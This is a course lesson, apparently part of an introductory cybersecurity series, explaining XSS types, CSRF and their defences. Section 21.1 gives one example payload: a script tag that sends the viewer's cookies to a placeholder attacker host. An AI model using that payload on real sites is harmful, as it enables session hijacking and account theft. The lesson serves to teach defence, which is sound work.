[Previous](./[20]-Injection-Attacks.md) | [Table of Contents](./[0]-Introduction-to-Cybersecurity.md) | [Next](./[22]-Authentication-and-Session-Vulnerabilities.md)

*Web Application Security*

# Lesson 21 - Cross-Site Scripting (XSS) & CSRF

## 21.1 What is XSS?

**Cross-Site Scripting (XSS)** occurs when an application includes untrusted input in a web page without properly neutralizing it, allowing an attacker's script to execute in another user's browser. Unlike SQL injection (which targets the database), XSS targets other *users* of the application.

A simple example: a comment box that displays user input directly on the page without escaping it. If a user submits `<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>` as a comment, and the site displays it unescaped, that script runs in the browser of anyone who views the comment — potentially stealing their session cookie (Lesson 22) and letting the attacker hijack their session.

---

## 21.2 Types of XSS

- **Stored XSS** — the malicious script is saved on the server (e.g., in a database) and served to every user who views the affected page, making it the most dangerous variant.
- **Reflected XSS** — the malicious script is included in a request (e.g., a URL parameter) and immediately reflected back in the response, typically requiring the victim to click a crafted link.
- **DOM-based XSS** — the vulnerability exists entirely in client-side JavaScript that unsafely handles data, without necessarily involving the server at all.

---

## 21.3 Defending Against XSS

- **Output encoding/escaping** — convert special characters (like `<` and `>`) into safe representations before displaying user input, so it's rendered as text rather than executed as code.
- **Content Security Policy (CSP)** — an HTTP header that restricts which sources of scripts a browser is allowed to execute, providing defense-in-depth even if an XSS flaw exists.
- **Input validation** — restricting input to expected formats where possible.
- **Modern frameworks** (like React or Angular) escape output by default, significantly reducing — though not eliminating — XSS risk when used correctly.

---

## 21.4 What is CSRF?

**Cross-Site Request Forgery (CSRF)** tricks a logged-in user's browser into unknowingly submitting a request to a site they're authenticated on. Because browsers automatically attach cookies to requests, a malicious page on a completely different site can silently trigger an action (like changing an email address or transferring funds) on a site where the victim is already logged in — the request appears legitimate because it carries the victim's valid session cookie.

---

## 21.5 Defending Against CSRF

- **CSRF tokens** — a unique, unpredictable token embedded in forms that the server verifies on submission; an attacker's forged request can't include a valid token.
- **SameSite cookie attribute** — tells the browser not to send cookies along with cross-site requests, which significantly mitigates CSRF at the browser level.
- **Re-authentication for sensitive actions** — requiring a password re-entry for high-impact actions like changing account credentials.

[Previous](./[20]-Injection-Attacks.md) | [Table of Contents](./[0]-Introduction-to-Cybersecurity.md) | [Next](./[22]-Authentication-and-Session-Vulnerabilities.md)
